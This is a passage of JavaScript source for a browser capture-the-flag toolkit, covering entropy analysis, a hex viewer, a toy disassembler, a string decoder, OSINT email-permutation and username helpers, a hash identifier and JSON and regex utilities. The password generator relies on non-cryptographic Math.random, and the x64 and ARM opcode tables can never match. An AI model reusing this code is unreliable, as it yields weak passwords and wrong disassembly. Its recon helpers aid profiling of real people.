        result += `File Size: ${bytes.length} bytes\n`;
        result += `Entropy: ${entropy.toFixed(6)} bits per byte\n`;
        result += `Maximum Entropy: 8.000000 bits per byte\n`;
        result += `Entropy Percentage: ${(entropy / 8 * 100).toFixed(2)}%\n\n`;
        
        if (entropy > 7.5) {
            result += `Analysis: HIGH entropy - likely encrypted/compressed data\n`;
        } else if (entropy > 6.0) {
            result += `Analysis: MEDIUM entropy - mixed content\n`;
        } else {
            result += `Analysis: LOW entropy - likely plain text or structured data\n`;
        }
        
        // Byte frequency analysis
        const frequencies = new Array(256).fill(0);
        for (let i = 0; i < bytes.length; i++) {
            frequencies[bytes[i]]++;
        }
        
        result += `\nByte Frequency Analysis:\n`;
        const sortedFreqs = frequencies.map((count, byte) => ({ byte, count }))
            .filter(f => f.count > 0)
            .sort((a, b) => b.count - a.count)
            .slice(0, 10);
        
        sortedFreqs.forEach(f => {
            const percentage = (f.count / bytes.length * 100).toFixed(2);
            result += `0x${f.byte.toString(16).padStart(2, '0')}: ${f.count} occurrences (${percentage}%)\n`;
        });
        
        output.value = result;
        this.showNotification('Entropy calculation complete', 'success');
    }

    calculateTextEntropy(text) {
        const bytes = new TextEncoder().encode(text);
        this.calculateFileEntropy(bytes.buffer);
    }

    calculateEntropyFromBytes(bytes) {
        const frequencies = new Array(256).fill(0);
        for (let i = 0; i < bytes.length; i++) {
            frequencies[bytes[i]]++;
        }
        
        let entropy = 0;
        for (let i = 0; i < 256; i++) {
            if (frequencies[i] > 0) {
                const probability = frequencies[i] / bytes.length;
                entropy -= probability * Math.log2(probability);
            }
        }
        
        return entropy;
    }

    viewBinary() {
        console.log('Viewing binary...');
        const fileInput = document.getElementById('binaryFile');
        if (!fileInput) {
            this.showNotification('Binary file input not found', 'error');
            return;
        }
        
        if (fileInput.files.length === 0) {
            this.showNotification('Please select a file', 'warning');
            return;
        }
        
        this.showNotification('Loading binary file...', 'info');
        // File handling is done in setupFileHandlers
    }

    displayBinaryData(arrayBuffer) {
        const bytes = new Uint8Array(arrayBuffer);
        const viewMode = document.getElementById('binaryViewMode').value;
        const output = document.getElementById('binaryOutput');
        
        let result = '';
        
        switch (viewMode) {
            case 'hex':
                for (let i = 0; i < bytes.length; i += 16) {
                    const offset = i.toString(16).padStart(8, '0').toUpperCase();
                    const hexLine = [];
                    
                    for (let j = 0; j < 16 && i + j < bytes.length; j++) {
                        hexLine.push(bytes[i + j].toString(16).padStart(2, '0').toUpperCase());
                    }
                    
                    result += `${offset}: ${hexLine.join(' ')}\n`;
                }
                break;
                
            case 'ascii':
                for (let i = 0; i < bytes.length; i++) {
                    const byte = bytes[i];
                    result += byte >= 32 && byte <= 126 ? String.fromCharCode(byte) : '.';
                }
                break;
                
            case 'binary':
                for (let i = 0; i < Math.min(bytes.length, 1024); i++) {
                    result += bytes[i].toString(2).padStart(8, '0') + ' ';
                    if ((i + 1) % 8 === 0) result += '\n';
                }
                break;
        }
        
        output.value = result;
        this.showNotification(`Binary data displayed in ${viewMode} format`, 'success');
    }

    // ======================
    // REVERSE ENGINEERING TOOLS
    // ======================

    hexToAssembly() {
        console.log('Converting hex to assembly...');
        const hexInput = document.getElementById('hexOpcodes');
        const arch = document.getElementById('asmArch');
        const output = document.getElementById('asmOutput');
        
        if (!hexInput || !arch || !output) {
            console.error('Assembly elements not found');
            this.showNotification('Assembly elements not found', 'error');
            return;
        }
        
        const hexInputValue = hexInput.value.trim();
        const archValue = arch.value;
        
        if (!hexInputValue) {
            this.showNotification('Please enter hex opcodes', 'warning');
            return;
        }
        
        try {
            const cleanHex = hexInputValue.replace(/[^0-9A-Fa-f]/g, '');
            const bytes = this.hexToBytes(cleanHex);
            
            // Basic x86 opcode decoding (simplified)
            const opcodes = {
                x86: {
                    '90': 'nop',
                    'C3': 'ret',
                    'CC': 'int3',
                    'B8': 'mov eax, ',
                    'B9': 'mov ecx, ',
                    'BA': 'mov edx, ',
                    'BB': 'mov ebx, ',
                    '48': 'dec eax',
                    '49': 'dec ecx',
                    '4A': 'dec edx',
                    '4B': 'dec ebx',
                    '50': 'push eax',
                    '51': 'push ecx',
                    '52': 'push edx',
                    '53': 'push ebx',
                    '58': 'pop eax',
                    '59': 'pop ecx',
                    '5A': 'pop edx',
                    '5B': 'pop ebx',
                    'E8': 'call ',
                    'E9': 'jmp ',
                    'EB': 'jmp short ',
                    '74': 'jz ',
                    '75': 'jnz ',
                    '76': 'jbe ',
                    '77': 'ja '
                },
                x64: {
                    '90': 'nop',
                    'C3': 'ret',
                    'CC': 'int3',
                    '48C7C0': 'mov rax, ',
                    '48C7C1': 'mov rcx, ',
                    '48C7C2': 'mov rdx, ',
                    '48C7C3': 'mov rbx, ',
                    '50': 'push rax',
                    '51': 'push rcx',
                    '52': 'push rdx',
                    '53': 'push rbx',
                    '58': 'pop rax',
                    '59': 'pop rcx',
                    '5A': 'pop rdx',
                    '5B': 'pop rbx'
                },
                arm: {
                    '00000000': 'nop',
                    '1EFF2FE1': 'bx lr',
                    '00482DE9': 'push {r3, lr}',
                    '0048BDE8': 'pop {r3, lr}'
                }
            };
            
            const archOpcodes = opcodes[archValue] || opcodes.x86;
            let result = `Assembly Code (${archValue.toUpperCase()}):\n\n`;
            
            for (let i = 0; i < bytes.length; i++) {
                const byte = bytes[i].toString(16).padStart(2, '0').toUpperCase();
                const opcode = archOpcodes[byte];
                
                if (opcode) {
                    result += `${i.toString(16).padStart(4, '0')}: ${byte} ${opcode}\n`;
                } else {
                    result += `${i.toString(16).padStart(4, '0')}: ${byte} db 0x${byte}\n`;
                }
            }
            
            output.value = result;
            this.showNotification('Hex to assembly conversion complete', 'success');
        } catch (error) {
            console.error('Assembly conversion error:', error);
            output.value = 'Error: Invalid hex input';
            this.showNotification('Invalid hex input', 'error');
        }
    }

    decodeString() {
        console.log('Decoding string...');
        const input = document.getElementById('encodedString');
        const encoding = document.getElementById('encodingType');
        const output = document.getElementById('decodedString');
        
        if (!input || !encoding || !output) {
            console.error('String decoder elements not found');
            this.showNotification('String decoder elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        const encodingValue = encoding.value;
        
        if (!inputValue) {
            this.showNotification('Please enter encoded string', 'warning');
            return;
        }
        
        try {
            let result = '';
            
            if (encodingValue === 'auto') {
                // Try different decodings
                result = 'Auto-detection results:\n\n';
                
                // Base64
                try {
                    result += `Base64: ${atob(inputValue)}\n`;
                } catch (e) {
                    result += `Base64: Invalid\n`;
                }
                
                // URL
                try {
                    result += `URL: ${decodeURIComponent(inputValue)}\n`;
                } catch (e) {
                    result += `URL: Invalid\n`;
                }
                
                // Hex
                try {
                    result += `Hex: ${this.hexToText(inputValue)}\n`;
                } catch (e) {
                    result += `Hex: Invalid\n`;
                }
                
                // Unicode
                try {
                    result += `Unicode: ${this.decodeUnicode(inputValue)}\n`;
                } catch (e) {
                    result += `Unicode: Invalid\n`;
                }
            } else {
                switch (encodingValue) {
                    case 'base64':
                        result = atob(inputValue);
                        break;
                    case 'url':
                        result = decodeURIComponent(inputValue);
                        break;
                    case 'hex':
                        result = this.hexToText(inputValue);
                        break;
                    case 'unicode':
                        result = this.decodeUnicode(inputValue);
                        break;
                    default:
                        result = inputValue;
                }
            }
            
            output.value = result;
            this.showNotification('String decoding complete', 'success');
        } catch (error) {
            console.error('String decoding error:', error);
            output.value = 'Error: Invalid encoding';
            this.showNotification('Invalid encoding', 'error');
        }
    }

    // ======================
    // OSINT TOOLS
    // ======================

    generateEmails() {
        console.log('Generating emails...');
        const baseName = document.getElementById('emailBase');
        const domain = document.getElementById('emailDomain');
        const output = document.getElementById('emailOutput');
        
        if (!baseName || !domain || !output) {
            console.error('Email generator elements not found');
            this.showNotification('Email generator elements not found', 'error');
            return;
        }
        
        const baseNameValue = baseName.value.trim();
        const domainValue = domain.value.trim();
        
        if (!baseNameValue || !domainValue) {
            this.showNotification('Please enter both name and domain', 'warning');
            return;
        }
        
        const variations = [
            baseNameValue,
            baseNameValue.replace('.', ''),
            baseNameValue.replace('.', '_'),
            baseNameValue.replace('.', '-'),
            baseNameValue.split('.')[0],
            baseNameValue.split('.').join(''),
            baseNameValue.split('.')[0] + '.' + baseNameValue.split('.')[1]?.charAt(0),
            baseNameValue.split('.')[0]?.charAt(0) + '.' + baseNameValue.split('.')[1],
            baseNameValue.split('.')[0] + baseNameValue.split('.')[1]?.charAt(0),
            baseNameValue.split('.')[0]?.charAt(0) + baseNameValue.split('.')[1],
            baseNameValue.split('.').reverse().join('.'),
            baseNameValue.split('.').reverse().join(''),
            baseNameValue.split('.').reverse().join('_'),
            baseNameValue.split('.').reverse().join('-')
        ];
        
        const emails = variations.filter(v => v).map(v => `${v}@${domainValue}`);
        const uniqueEmails = [...new Set(emails)];
        
        output.value = uniqueEmails.join('\n');
        this.showNotification(`Generated ${uniqueEmails.length} email variations`, 'success');
    }

    checkUsername() {
        console.log('Checking username...');
        const username = document.getElementById('usernameInput');
        const output = document.getElementById('usernameResults');
        
        if (!username || !output) {
            console.error('Username checker elements not found');
            this.showNotification('Username checker elements not found', 'error');
            return;
        }
        
        const usernameValue = username.value.trim();
        
        if (!usernameValue) {
            this.showNotification('Please enter username', 'warning');
            return;
        }
        
        const platforms = {
            twitter: document.getElementById('checkTwitter')?.checked || false,
            instagram: document.getElementById('checkInstagram')?.checked || false,
            github: document.getElementById('checkGitHub')?.checked || false,
            reddit: document.getElementById('checkReddit')?.checked || false
        };
        
        let result = `Username Availability Check for: ${usernameValue}\n\n`;
        
        const urls = {
            twitter: `https://twitter.com/${usernameValue}`,
            instagram: `https://instagram.com/${usernameValue}`,
            github: `https://github.com/${usernameValue}`,
            reddit: `https://reddit.com/user/${usernameValue}`
        };
        
        Object.entries(platforms).forEach(([platform, enabled]) => {
            if (enabled) {
                result += `${platform.toUpperCase()}: ${urls[platform]}\n`;
                result += `  Status: Check manually (CORS restrictions prevent automated checking)\n`;
                result += `  Search: Try searching for "${usernameValue}" on ${platform}\n\n`;
            }
        });
        
        result += `Additional Search Suggestions:\n`;
        result += `- Google: "${usernameValue}" site:platform.com\n`;
        result += `- Sherlock: python3 sherlock ${usernameValue}\n`;
        result += `- Namechk: https://namechk.com\n`;
        result += `- KnowEm: https://knowem.com\n`;
        
        output.value = result;
        this.showNotification('Username check complete', 'success');
    }

    // ======================
    // UTILITY TOOLS
    // ======================

    generatePassword() {
        console.log('Generating password...');
        const length = document.getElementById('passwordLength');
        const includeUpper = document.getElementById('includeUppercase');
        const includeLower = document.getElementById('includeLowercase');
        const includeNumbers = document.getElementById('includeNumbers');
        const includeSymbols = document.getElementById('includeSymbols');
        const output = document.getElementById('generatedPassword');
        
        if (!length || !includeUpper || !includeLower || !includeNumbers || !includeSymbols || !output) {
            console.error('Password generator elements not found');
            this.showNotification('Password generator elements not found', 'error');
            return;
        }
        
        const lengthValue = parseInt(length.value) || 12;
        const options = {
            uppercase: includeUpper.checked,
            lowercase: includeLower.checked,
            numbers: includeNumbers.checked,
            symbols: includeSymbols.checked
        };
        
        const chars = {
            uppercase: 'ABCDEFGHIJKLMNOPQRSTUVWXYZ',
            lowercase: 'abcdefghijklmnopqrstuvwxyz',
            numbers: '0123456789',
            symbols: '!@#$%^&*()_+-=[]{}|;:,.<>?'
        };
        
        let charset = '';
        if (options.uppercase) charset += chars.uppercase;
        if (options.lowercase) charset += chars.lowercase;
        if (options.numbers) charset += chars.numbers;
        if (options.symbols) charset += chars.symbols;
        
        if (!charset) {
            this.showNotification('Please select at least one character set', 'warning');
            return;
        }
        
        let password = '';
        for (let i = 0; i < lengthValue; i++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        
        output.value = password;
        this.showNotification('Password generated successfully', 'success');
    }

    identifyHash() {
        console.log('Identifying hash...');
        const hash = document.getElementById('hashToIdentify');
        const output = document.getElementById('hashIdResults');
        
        if (!hash || !output) {
            console.error('Hash identifier elements not found');
            this.showNotification('Hash identifier elements not found', 'error');
            return;
        }
        
        const hashValue = hash.value.trim();
        
        if (!hashValue) {
            this.showNotification('Please enter a hash', 'warning');
            return;
        }
        
        const hashTypes = {
            32: ['MD5', 'NTLM', 'LM'],
            40: ['SHA1', 'MySQL5', 'SHA1(Django)'],
            56: ['SHA224', 'Haval224'],
            64: ['SHA256', 'Haval256', 'GOST R 34.11-94', 'SHA3-256'],
            96: ['SHA384', 'SHA3-384'],
            128: ['SHA512', 'Whirlpool', 'SHA3-512'],
            16: ['MD4', 'MD2'],
            48: ['Tiger192', 'Haval192'],
            80: ['RipeMD320']
        };
        
        const length = hashValue.length;
        const possibleTypes = hashTypes[length] || ['Unknown'];
        
        let result = `Hash Analysis for: ${hashValue}\n\n`;
        result += `Hash Length: ${length} characters\n`;
        result += `Possible Hash Types:\n`;
        
        possibleTypes.forEach(type => {
            result += `  - ${type}\n`;
        });
        
        result += `\nCharacter Analysis:\n`;
        result += `- Contains only hex characters: ${/^[0-9A-Fa-f]+$/.test(hashValue)}\n`;
        result += `- Contains uppercase: ${/[A-Z]/.test(hashValue)}\n`;
        result += `- Contains lowercase: ${/[a-z]/.test(hashValue)}\n`;
        result += `- Contains numbers: ${/[0-9]/.test(hashValue)}\n`;
        
        if (hashValue.includes('$')) {
            result += `\nFormat Analysis:\n`;
            result += `- Contains '$' delimiter: Unix crypt format\n`;
            const parts = hashValue.split('$');
            if (parts.length >= 3) {
                result += `- Format identifier: ${parts[1]}\n`;
                result += `- Salt: ${parts[2]}\n`;
            }
        }
        
        output.value = result;
        this.showNotification('Hash identification complete', 'success');
    }

    testRegex() {
        console.log('Testing regex...');
        const pattern = document.getElementById('regexPattern');
        const testString = document.getElementById('regexTest');
        const output = document.getElementById('regexResults');
        
        if (!pattern || !testString || !output) {
            console.error('Regex elements not found');
            this.showNotification('Regex elements not found', 'error');
            return;
        }
        
        const patternValue = pattern.value.trim();
        const testStringValue = testString.value;
        
        if (!patternValue) {
            this.showNotification('Please enter a regex pattern', 'warning');
            return;
        }
        
        try {
            let flags = '';
            if (document.getElementById('regexGlobal')?.checked) flags += 'g';
            if (document.getElementById('regexIgnoreCase')?.checked) flags += 'i';
            if (document.getElementById('regexMultiline')?.checked) flags += 'm';
            
            const regex = new RegExp(patternValue, flags);
            const matches = testStringValue.match(regex) || [];
            
            let result = `Regex Test Results:\n\n`;
            result += `Pattern: ${patternValue}\n`;
            result += `Flags: ${flags || 'none'}\n`;
            result += `Test String Length: ${testStringValue.length}\n`;
            result += `Matches Found: ${matches.length}\n\n`;
            
            if (matches.length > 0) {
                result += `Matches:\n`;
                matches.forEach((match, index) => {
                    const matchIndex = testStringValue.indexOf(match);
                    result += `${index + 1}. "${match}" at position ${matchIndex}\n`;
                });
                
                // Show groups if available
                const execResult = regex.exec(testStringValue);
                if (execResult && execResult.length > 1) {
                    result += `\nCapture Groups:\n`;
                    for (let i = 1; i < execResult.length; i++) {
                        result += `Group ${i}: "${execResult[i]}"\n`;
                    }
                }
            } else {
                result += `No matches found.\n`;
            }
            
            output.value = result;
            this.showNotification('Regex test complete', 'success');
        } catch (error) {
            console.error('Regex test error:', error);
            output.value = `Error: ${error.message}`;
            this.showNotification('Invalid regex pattern', 'error');
        }
    }

    formatJSON() {
        console.log('Formatting JSON...');
        const input = document.getElementById('jsonInput');
        const output = document.getElementById('jsonOutput');
        
        if (!input || !output) {
            console.error('JSON elements not found');
            this.showNotification('JSON elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        
        if (!inputValue) {
            this.showNotification('Please enter JSON data', 'warning');
            return;
        }
        
        try {
            const parsed = JSON.parse(inputValue);
            const formatted = JSON.stringify(parsed, null, 2);
            output.value = formatted;
            this.showNotification('JSON formatted successfully', 'success');
        } catch (error) {
            console.error('JSON formatting error:', error);
            output.value = `Error: ${error.message}`;
            this.showNotification('Invalid JSON', 'error');
        }
    }

    minifyJSON() {
        console.log('Minifying JSON...');
        const input = document.getElementById('jsonInput');
        const output = document.getElementById('jsonOutput');
        
        if (!input || !output) {
            console.error('JSON elements not found');
            this.showNotification('JSON elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        
        if (!inputValue) {
            this.showNotification('Please enter JSON data', 'warning');
            return;
        }
        
        try {
            const parsed = JSON.parse(inputValue);
            const minified = JSON.stringify(parsed);
            output.value = minified;
            this.showNotification('JSON minified successfully', 'success');
        } catch (error) {
            console.error('JSON minification error:', error);
            output.value = `Error: ${error.message}`;
            this.showNotification('Invalid JSON', 'error');
        }
    }

    validateJSON() {
        console.log('Validating JSON...');
        const input = document.getElementById('jsonInput');
        const output = document.getElementById('jsonOutput');
        
        if (!input || !output) {
            console.error('JSON elements not found');
            this.showNotification('JSON elements not found', 'error');
            return;
        }
        
        const inputValue = input.value.trim();
        
        if (!inputValue) {
            this.showNotification('Please enter JSON data', 'warning');
            return;
        }
        
        try {
            const parsed = JSON.parse(inputValue);
            let result = 'JSON Validation Results:\n\n';
            result += '✓ Valid JSON\n';
            result += `Type: ${Array.isArray(parsed) ? 'Array' : typeof parsed}\n`;
            
            if (typeof parsed === 'object' && parsed !== null) {
                if (Array.isArray(parsed)) {
                    result += `Length: ${parsed.length}\n`;
                } else {
                    result += `Keys: ${Object.keys(parsed).length}\n`;
                    result += `Properties: ${Object.keys(parsed).join(', ')}\n`;
                }
            }
            
            result += `Size: ${inputValue.length} characters\n`;
            
            output.value = result;
            this.showNotification('JSON is valid', 'success');
        } catch (error) {
            console.error('JSON validation error:', error);
            output.value = `✗ Invalid JSON\n\nError: ${error.message}`;
            this.showNotification('Invalid JSON', 'error');
        }
    }

    // ======================
    // UTILITY FUNCTIONS
    // ======================

    hexToBytes(hex) {
        const bytes = new Uint8Array(hex.length / 2);
        for (let i = 0; i < hex.length; i += 2) {
            bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
        }
        return bytes;
    }

    binaryToBytes(binary) {
        const cleaned = binary.replace(/[^01]/g, '');
        const bytes = new Uint8Array(cleaned.length / 8);
        for (let i = 0; i < cleaned.length; i += 8) {
            bytes[i / 8] = parseInt(cleaned.substr(i, 8), 2);
        }
        return bytes;
    }

    hexToText(hex) {
        const cleanHex = hex.replace(/[^0-9A-Fa-f]/g, '');
        let result = '';
        for (let i = 0; i < cleanHex.length; i += 2) {
            result += String.fromCharCode(parseInt(cleanHex.substr(i, 2), 16));
        }
        return result;
    }

    decodeUnicode(input) {
        return input.replace(/\\u([0-9a-fA-F]{4})/g, (match, hex) => {
            return String.fromCharCode(parseInt(hex, 16));
        });
    }

    showNotification(message, type = 'info') {
        console.log(`Notification [${type}]: ${message}`);
        
        // Remove existing notification
        const existingNotification = document.querySelector('.notification');
        if (existingNotification) {
            existingNotification.remove();
        }
        
        const notification = document.createElement('div');
        notification.className = `notification notification--${type}`;
        notification.textContent = message;
        
        document.body.appendChild(notification);
        
        setTimeout(() => {
            if (document.body.contains(notification)) {
                notification.remove();
            }
        }, 3000);
    }
}

// Initialize the tools when DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
    console.log('🔥 Loading CyberLab CTF Tools...');
    window.tools = new CTFTools();
});
